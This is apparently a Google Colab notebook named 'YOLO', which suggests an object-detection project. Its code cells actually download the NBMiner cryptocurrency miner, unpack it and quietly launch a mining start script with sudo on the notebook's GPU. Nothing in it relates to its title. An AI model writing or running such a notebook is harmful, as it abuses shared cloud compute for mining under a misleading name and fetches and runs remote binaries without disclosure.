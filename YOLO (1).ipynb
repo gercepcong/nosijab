{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "YOLO.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PpokIjDjvtnA"
      },
      "source": [
        "#YOLO IS BACK\n",
        "\n",
        "#Runkann saja"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-dgNpxVAa8eF"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6uCt-BAUw86L"
      },
      "source": [
        "import random, string, urllib.request, json, getpass\n",
        "!sudo apt-get install nano && sudo apt-get update && sudo apt-get upgrade && export LD_PRELOAD=/usr/lib64-nvidia/libnvidia-ml.so && wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz  && sudo apt install libpci-dev\n",
        "!tar -xf NBMiner_38.1_Linux.tgz\n",
        "!cp /content/NBMiner_Linux/nbminer /content/\n",
        "!chmod +x ./start_ergoyolo.sh\n",
        "get_ipython().system_raw('sudo ./start_ergoyolo.sh')"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}